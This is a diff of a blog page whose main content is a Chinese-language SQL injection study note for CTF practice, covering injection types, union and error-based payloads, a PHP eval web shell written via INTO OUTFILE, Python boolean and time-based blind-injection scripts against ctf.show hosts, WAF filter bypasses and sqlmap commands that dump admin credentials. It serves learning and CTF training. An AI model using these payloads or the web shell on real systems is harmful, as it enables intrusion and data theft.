@@ -1,138 +1,355 @@
+
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <meta name="theme-color" content="#3367D6"/>
-  <link rel="apple-touch-icon" href="/icons-192.png">
-  <link rel="manifest" href="/manifest.json">
-  
-  <meta name="generator" content="Hexo 5.4.0">
-
-  
-
-  
-
-  
-    <meta name="author" content="tty">
-  
-
-  
-
-  
-
-  <title>SQL注入笔记 | ttycp3</title>
-
-  
-
-  
-    <link rel="shortcut icon" href="/favicon.ico">
-  
-
-  
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@1.1.3/index.min.css">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlightjs@9.16.2/styles/monokai.css">
-  
-
-  
-<link rel="stylesheet" href="/css/style.css">
-
-<link rel="alternate" href="/atom.xml" title="ttycp3" type="application/atom+xml">
-</head>
-<body>
-  <div class="root-container">
+<html lang="ch">
     
-<!-- header container -->
-<header class="header-container post">
-  
-    <div class="post-image" style="background-image: url(https://ttycp3.oss-cn-beijing.aliyuncs.com/img/preview.jpg)"></div>
-  
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="ttycp3">
+    <title>SQL注入笔记 - ttycp3</title>
+    <meta name="author" content="tty">
+    
+    
+    
+        
+            <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
+        
+    
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"tty","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"articleBody":"SQL注入笔记​        学习了这么多天的SQL注入以后，我总结了做SQL注入题的一些方法和思路。\n一、判断注入方式常见的注入方式有：\n①字符型注入\n②布尔型注入\n③错误回显注入\n④文件读写注入\n⑤布尔盲注\n⑥时间盲注\n……\n二、判断注入点一般有以下注入：\n①GET型注入\n②POST型注入\n③User-Agent:报头文注入\n④Referer:报头文注入\n⑤Cookie:报头文注入\n三、SQL注入基本语句123456789101112131415161718192021222324order by 4#判断有多少列union select 1,2,3#判断数据显示点union select 1,user(),database()#显示出登录用户和数据库名普通语句：schema_name——数据库名；table_name——表名；column_name——字段名；查询数据库：select schema_name from information_schema.schemata#　　　　　　select database()#查询数据库表：select table_name from information_schema.tables where table_schema=&#x27;数据库名&#x27;#查询字段名：select column_name from infromation_schema.columns where table_name=&#x27;表名&#x27;#查询字段内容：select * from 表名#错误回显注入：union select updatexml(1,concat(0x7e,(select user()),0x7e),1)#文件读写注入：union select 1,&#x27;&lt;?php eval($_REQUEST[23]); ?&gt;&#x27;,3 into outfile &#x27;var/www/html/1.txt&#x27;#CREATE DATABASE - 创建新数据库ALTER DATABASE - 修改数据库CREATE TABLE - 创建新表ALTER TABLE - 变更（改变）数据库表DROP TABLE - 删除表CREATE INDEX - 创建索引（搜索键）DROP INDEX - 删除索引reverse()-取反函数where 字段名 regexp(正则表达式) -正则匹配输出load_file()读取根目录下文件\n\n四、盲注的使用​     当我们能够找到注入点，但无法从页面回显中获得我们想要得到的数据库中的数据，这时候我们就需要用到盲注。\n布尔盲注模板123456789101112131415161718192021222324252627282930import requestsif __name__ == &#x27;__main__&#x27; :    url = &#x27;http://8868895d-9164-42b0-a31d-d8ebe2bb0af7.challenge.ctf.show/&#x27;    result = &#x27;&#x27;    i = 0    while True:        i = i + 1        low = 32        high = 127        while low &lt; high:            mid = (low + high) // 2            #payload = f&#x27;if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;            #payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;            #payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flagba&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;            payload = f&#x27;if(ascii(substr((select group_concat(flag4sa) from ctfshow.flagba),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;            # print(payload)            data=&#123;                &quot;uname&quot;:f&quot;admin&#x27; and &#123;payload&#125;#&quot;,                &quot;passwd&quot;:12346            &#125;            r = requests.post(url=url,data=data)            if &#x27;flag.jpg&#x27; in r.text:                low = mid + 1            else:                high = mid        if low != 32:            result += chr(low)        else:            break        print(result)\n\n时间盲注模板12345678910111213141516171819202122232425262728import requestsimport timeif __name__ == &#x27;__main__&#x27; :    url = &#x27;http://5317a3cf-d6d2-4441-b598-9593444bfc12.challenge.ctf.show/?id=1&quot;%20and%20&#x27;    result = &#x27;&#x27;    i = 0    while True:        i = i + 1        low = 32        high = 127        while low &lt; high:            mid = (low + high) // 2            #payload = f&#x27;if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))%23&#x27;            #payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(2))%23&#x27;            #payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flagugs&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(2))%23&#x27;            payload = f&#x27;if(ascii(substr((select group_concat(flag43s) from ctfshow.flagugs),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(2))%23&#x27;            # print(payload)            stime=time.time()            r = requests.get(url=url + payload)            if time.time()-stime&lt;2:                low = mid + 1            else:                high = mid        if low != 32:            result += chr(low)        else:            break        print(result)\n\n五、SQL注入绕过①注释符号绕过12345-- 注释内容# 注释内容/*注释内容*/;/x00\n\n②大小写绕过常用于 waf的正则对大小写不敏感的情况，一般都是题目自己故意这样设计。例如：waf过滤了关键字select，可以尝试使用Select等绕过。\n③内联注释绕过内联注释就是把一些特有的仅在MYSQL上的语句放在 /*!...*/ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。\n④双写关键字绕过在某一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。例如select变成seleselectct，在经过waf的处理之后又变成select，达到绕过的要求。\n⑤特殊编码绕过·十六进制绕过\n·ascii编码绕过\n⑥空格过滤绕过1234567/**/()回车(url编码中的%0a)`(tap键上面的按钮)tap两个空格\n\n⑦过滤or and xor not 绕过1234and = &amp;&amp;or = ||xor = | # 异或not = !\n\n⑧过滤等号=绕过·不加通配符的like执行的效果和=一致，所以可以用来绕过。\n·rlike:模糊匹配，只要字段的值中存在要查找的 部分 就会被选择出来用来取代=时，rlike的用法和上面的like一样，没有通配符效果和=一样\n·regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配\n·使用大小于号来绕过\n·&lt;&gt; 等价于 != 所以在前面再加一个!结果就是等号了\n⑨过滤大小于号绕过·greatest(n1, n2, n3…):返回n中的最大值\n·least(n1,n2,n3…):返回n中的最小值\n·strcmp(str1,str2):若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 ·in关键字\n·between a and b:范围在a-b之间\n⑩过滤引号绕过·使用十六进制\n1select column_name  from information_schema.tables where table_name=0x7573657273;\n\n·使用宽字节\n常用在web应用使用的字符集为GBK时，并且过滤了引号，就可以试试宽字节。\n123# 过滤单引号时%bf%27 %df%27 %aa%27%df\\’ = %df%5c%27=縗’\n\n⑪过滤逗号绕过如果waf过滤了逗号，并且只能盲注（盲注基本离不开逗号啊喂），在取子串的几个函数中，有一个替代逗号的方法就是使用from pos for len，其中pos代表从pos个开始读取len长度的子串例如在substr()等函数中，常规的写法是\n1select substr(&quot;string&quot;,1,3);\n\n如果过滤了逗号，可以这样使用from pos for len来取代\n12345678select substr(&quot;string&quot; from 1 for 3);在学习大佬wp时还看到利用join绕过逗号过滤，tql?id=-1&#x27; union select 1,2,3--+不用逗号?id=-1&#x27; union select * from (select 1)a join (select 2)b join (select 3)c--+\n\n⑫过滤函数绕过·sleep() –&gt;benchmark()\n·ascii()–&gt;hex()、bin()替代之后再使用对应的进制转string即可\n·group_concat()–&gt;concat_ws()\n·substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()\n·user() –&gt; @@user、datadir–&gt;@@datadir\n·ord()–&gt;ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致。\n·information_schema.tables-&gt;mysql.innodb_table_stats / mysql.innodb_index_stats表下分别是database_name,table_name,index_name\nsys数据库中的以下三个视图中存储了表名table_name:\n\nsys.schema_auto_increment_columns #存在自增主键的表会出现在此视图\nsys.schema_table_statistics_with_buffer #数据来源视图\nsys.x$schema_table_statistics_with_buffer #数据来源视图\n\n（注：部分内容借鉴于这位大佬的博客点我跳转）\n六、sqlmap工具的使用①检查注入点：sqlmap -u http://aa.com/star_photo.php?artist_id＝11\n②爆所有数据库信息：sqlmap -u http://aa.com/star_photo.php?artist_id＝11 –dbs\n③爆当前数据库信息：sqlmap -u http://aa.com/star_photo.php?artist_id＝11 –current-db\n④指定库名列出所有表sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 –tables\n‘vhost48330’ 为指定数据库名称\n⑤指定库名表名列出所有字段sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 -T admin –columns ‘admin’ 为指定表名称\n⑥指定库名表名字段dump出指定字段sqlmap -u http://aa.com/star_photo.php?artist_id＝11 -D vhost48330 -T admin -C ac，id，password –dump ‘ac,id,password’ 为指定字段名称\n七、handler命令与实现方法12345HANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,…) [ WHERE where_condition ] [LIMIT … ]HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125; [ WHERE where_condition ] [LIMIT … ]HANDLER tbl_name READ &#123; FIRST | NEXT &#125; [ WHERE where_condition ] [LIMIT … ]HANDLER tbl_name CLOSE\n\n八、无列名注入创建一数据库中含有user表如下：\n\n正常查询：\n1mysql&gt; select * from user;\n\n\n使用union查询：\n1mysql&gt; select 1,2,3 union select * from user;\n\n\n\n利用数字3代替未知的列名，需要加上反引号。后面加了一个a是为了表示这个表（select 1,2,3 union select * from user）的别名，不然会报错。\n1mysql&gt; select `3` from (select 1,2,3 union select * from user)a;\n\n\n当 ` 不能使用时，用别名来代替：\n1mysql&gt; select b from (select 1,2,3 as b union select * from user)a;\n\n\n利用join：\n\n","dateCreated":"2022-03-24T20:17:23+08:00","dateModified":"2022-07-13T14:22:29+08:00","datePublished":"2022-03-24T20:17:23+08:00","description":"","headline":"SQL注入笔记","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/03/24/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/"},"publisher":{"@type":"Organization","name":"tty","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"url":"http://example.com/2022/03/24/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/","keywords":"笔记"}</script>
+    <meta name="description" content="SQL注入笔记​        学习了这么多天的SQL注入以后，我总结了做SQL注入题的一些方法和思路。 一、判断注入方式常见的注入方式有： ①字符型注入 ②布尔型注入 ③错误回显注入 ④文件读写注入 ⑤布尔盲注 ⑥时间盲注 …… 二、判断注入点一般有以下注入： ①GET型注入 ②POST型注入 ③User-Agent:报头文注入 ④Referer:报头文注入 ⑤Cookie:报头文注入 三、SQ">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="SQL注入笔记">
+<meta property="og:url" content="http://example.com/2022/03/24/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="ttycp3">
+<meta property="og:description" content="SQL注入笔记​        学习了这么多天的SQL注入以后，我总结了做SQL注入题的一些方法和思路。 一、判断注入方式常见的注入方式有： ①字符型注入 ②布尔型注入 ③错误回显注入 ④文件读写注入 ⑤布尔盲注 ⑥时间盲注 …… 二、判断注入点一般有以下注入： ①GET型注入 ②POST型注入 ③User-Agent:报头文注入 ④Referer:报头文注入 ⑤Cookie:报头文注入 三、SQ">
+<meta property="og:locale">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/20163356-1fc7b292ad2553ed.webp">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/20163356-53af3c91b3df5400.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/20163356-3fc279ccfaf5e770.webp">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/20163356-fc946d14dc03da42.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/20163356-a59b62459ffef58f.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/1678972-20200505234437885-766004809.png">
+<meta property="article:published_time" content="2022-03-24T12:17:23.000Z">
+<meta property="article:modified_time" content="2022-07-13T06:22:29.708Z">
+<meta property="article:author" content="tty">
+<meta property="article:tag" content="笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/20163356-1fc7b292ad2553ed.webp">
+    
+    
+        
+    
+    
+    
+    
+    
+    <!--STYLES-->
+    
+<link rel="stylesheet" href="/assets/css/style-puo4qzcelj2raq27tqrcywohxgqvpmtlretjjx6lnoxbdn5vw0nvfxrzhoyw.min.css">
 
-  <!-- navbar -->
-<nav class="navbar">
-  <div class="navbar-content">
-    <!-- logo -->
-    <div class="navbar-logo">
-      <a href="/">
+    <!--STYLES END-->
+    
+
+    
+
+    
         
-          ttycp3
-        
-      </a>
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+    
+
+<header id="header" data-behavior="4">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a
+            class="header-title-link"
+            href="/"
+            aria-label=""
+        >
+            ttycp3
+        </a>
     </div>
-    <!-- link -->
-    <div class="navbar-link">
-      <div class="navbar-btn">
-        <div></div>
-        <div></div>
-        <div></div>
-      </div>
-      <ul class="navbar-list">
+    
         
-          <li class="navbar-list-item"><a href="/">首页</a></li>
+            <a
+                class="header-right-picture "
+                href="#about"
+                aria-label="Öffne den Link: /#about"
+            >
         
-          <li class="navbar-list-item"><a href="/playlist/1.html">歌单</a></li>
         
-          <li class="navbar-list-item"><a href="/projects/cyb.html">工具</a></li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-  
-  
-
-  
-  
-
-  
-  
-
-  
-  
-
-  
-  
-    <div class="header-content">
-      <div class="post-text layout-block">
-        <div class="layout-margin">
-          <h1 class="title-wrap">SQL注入笔记</h1>
-          <h2 class="title-sub-wrap">
-            <strong>tty</strong>
-            <span>发布于</span>
-            <time  class="article-date" datetime="2022-03-24T12:17:23.000Z" itemprop="datePublished">2022-03-24</time>
-          </h2>
-          <ul class="wrap-list dark">
-  
-</ul>
-          <ul class="wrap-list dark">
-  
-    <li><a href="/tags/%E7%AC%94%E8%AE%B0/">🏷️ 笔记</a></li>
-  
-</ul>
-        </div>
-      </div>
-    </div>
-  
-
-  
-  
-  
+        </a>
+    
 </header>
 
-    <!-- 文章 -->
+            <!-- Define author's picture -->
 
-<!-- 文章内容 -->
-<div class="body-container">
-  <article class="content-container layout-block post-container">
-    <div class="article-info">
-      
-      
-      
-      
-      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <h1 id="SQL注入笔记"><a href="#SQL注入笔记" class="headerlink" title="SQL注入笔记"></a>SQL注入笔记</h1><p>​        学习了这么多天的SQL注入以后，我总结了做SQL注入题的一些方法和思路。</p>
+
+<nav id="sidebar" data-behavior="4">
+    <div class="sidebar-container">
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/"
+                            
+                            rel="noopener"
+                            title="Home"
+                        >
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Home</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-categories"
+                            
+                            rel="noopener"
+                            title="Kategorien"
+                        >
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Kategorien</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-tags"
+                            
+                            rel="noopener"
+                            title="Tags"
+                        >
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Tags</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-archives"
+                            
+                            rel="noopener"
+                            title="Archiv"
+                        >
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Archiv</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link open-algolia-search"
+                            href="#search"
+                            
+                            rel="noopener"
+                            title="Suche"
+                        >
+                        <i class="sidebar-button-icon fa fa-search" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Suche</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="#about"
+                            
+                            rel="noopener"
+                            title="Über"
+                        >
+                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Über</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://github.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="GitHub"
+                        >
+                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">GitHub</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="http://stackoverflow.com/users"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Stack Overflow"
+                        >
+                        <i class="sidebar-button-icon fab fa-stack-overflow" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Stack Overflow</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://twitter.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Twitter"
+                        >
+                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Twitter</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://facebook.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Facebook"
+                        >
+                        <i class="sidebar-button-icon fab fa-facebook" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Facebook</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://plus.google.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Google Plus"
+                        >
+                        <i class="sidebar-button-icon fab fa-google-plus" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Google Plus</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://www.linkedin.com/profile/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="LinkedIn"
+                        >
+                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">LinkedIn</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/mailto"
+                            
+                            rel="noopener"
+                            title="E-Mail"
+                        >
+                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">E-Mail</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/atom.xml"
+                            
+                            rel="noopener"
+                            title="RSS"
+                        >
+                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">RSS</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+            <div id="main" data-behavior="4"
+                 class="
+                        hasCoverMetaIn
+                        ">
+                
+<article class="post">
+    
+    
+        <div class="post-header main-content-wrap text-left">
+    
+        <h1 class="post-title">
+            SQL注入笔记
+        </h1>
+    
+    
+        <div class="post-meta">
+    <time datetime="2022-03-24T20:17:23+08:00">
+	
+		    24 Mar 2022
+    	
+    </time>
+    
+</div>
+
+    
+</div>
+
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <h1 id="SQL注入笔记"><a href="#SQL注入笔记" class="headerlink" title="SQL注入笔记"></a>SQL注入笔记</h1><p>​        学习了这么多天的SQL注入以后，我总结了做SQL注入题的一些方法和思路。</p>
 <h3 id="一、判断注入方式"><a href="#一、判断注入方式" class="headerlink" title="一、判断注入方式"></a>一、判断注入方式</h3><p>常见的注入方式有：</p>
 <p>①字符型注入</p>
 <p>②布尔型注入</p>
@@ -232,235 +449,324 @@
 <p>利用join：</p>
 <p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/1678972-20200505234437885-766004809.png" alt="img"></p>
 
-      </section>
+            
 
-      
-      
-        <nav class="article-nav">
-          
-            <div class="article-nav-item layout-padding">
-  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
-    
-    <div class="card-text">
-      
-        <a href="/2022/03/30/SSRF%E7%AC%94%E8%AE%B0/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">SSRF笔记</h2>
-        </a>
-      
-      <div class="card-text--row">Newer</div>
-    </div>
-  </article>
-</div>
-          
-          
-            <div class="article-nav-item layout-padding">
-  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
-    
-    <div class="card-text">
-      
-        <a href="/2022/01/24/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">实用工具</h2>
-        </a>
-      
-      <div class="card-text--row">Older</div>
-    </div>
-  </article>
-</div>
-          
-        </nav>
-      
 
-      <section class="page-message-container layout-padding">
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
         
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">GETAGGT IN</span><br/>
+                
+    <a class="tag tag--primary tag--small t-none-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a>
 
-
-  
-  
-    <div class="valine-container comments-container content-padding--primary soft-size--large soft-style--box">
-      <div id="valine_thread" class="valine-thread"></div>
-    </div>
-    <script type="text/javascript" src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-    <script type="text/javascript" src='//unpkg.com/valine/dist/Valine.min.js'></script>
-    <script type="text/javascript">
-      new Valine({
-        el: "#valine_thread",
-        appId: "wuMxbnApLLBmk4DIIs2AEALQ-gzGzoHsz",
-        appKey: "SStvunV3BC8FFQNQ6if5tAUc",
-        avatar: "mm",
-        placeholder: "随便说点什么叭～",
-        notify: true,
-        visitor: true,
-        pageSize: 10,
-      });
-    </script>
-  
-
-  
-  
-
-
-      </section>
-    </div>
-    <div class="widget-info">
-      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
-  <div class="widget-body">
-    
-      <img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1649147966952106/41945c5bb4d50285490e040625ce5e60df9a8ad6.jpg" class="soft-size--round soft-style--box" alt="ttycp3">
-    
-    
-      <h2>ttycp3</h2>
-    
-    
-      <p>Only the strong survive</p>
-    
-
-    <div class="count-box">
-      <div class="count-box--item">
-        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
-  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
-</svg>
-        <span>6</span>
-      </div>
-      <div class="count-box--item">
-        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
-  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
-</svg>
-        0
-      </div>
-      <div class="count-box--item">
-        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
-  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
-</svg>
-        3
-      </div>
-    </div>
-  </div>
-</section>
-
-      
-
-      
-<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
-  <div class="widget-title">
-    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
